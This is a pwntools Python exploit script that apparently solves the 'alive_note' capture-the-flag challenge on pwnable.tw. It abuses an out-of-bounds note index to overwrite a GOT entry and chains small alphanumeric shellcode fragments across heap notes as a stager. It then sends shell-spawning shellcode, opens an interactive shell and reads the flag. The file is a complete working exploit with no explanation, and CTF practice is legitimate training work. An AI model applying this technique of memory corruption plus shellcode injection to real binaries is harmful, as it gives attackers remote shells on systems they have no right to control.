from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(idx,name="A\n"):
	cmd(1)
	p.sendlineafter("Index :",str(idx))
	p.sendafter("Name :",name)
def show(idx):
	cmd(2)
	p.sendlineafter("Index :",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Index :",str(idx))
def pwn(addr):
	idx=0xffffffff
	while(addr!=(idx*4+0x804a080) % 0x100000000):
		idx-=1
	return idx-0x100000000
#context.log_level='debug'
p=remote("chall.pwnable.tw",10300)
#p=process("./alive_note")
#gdb.attach(p,'b *0x80488ea')
p1='''
push eax
pop ecx
dec edx
push edx
pop eax
inc edx
'''
p2='''
xor [ecx+0x41],ax
inc edx
inc edx
'''
p3='''
inc edx
inc edx
inc edx
push edx
pop eax
dec edx
'''
p4='''
dec edx
xor [ecx+0x42],ax
push edx
'''
p5='''
pop eax
push 0x7a
pop edx
push 0x69
'''
p1=asm(p1)
p2=asm(p2)
p3=asm(p3)
p4=asm(p4)
p5=asm(p5)
add(pwn(0x804a014),p1+"q8")
add(1)
add(1)
add(1)
add(1,p2+'q8')
add(2)
add(2)
add(2,'\x32\x7a')
add(2,p3)
add(3)
add(3)
add(3)
add(3,p4+'q8')
add(4)
add(4)
add(4)
add(4,p5+'q'+'\x39')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
free(4)
context.arch='i386'
shellcode="\x90"*70+asm(shellcraft.sh())
p.send(shellcode)
sleep(1)
p.sendline("cat /home/alive_note/flag")
p.interactive(">> nier ")
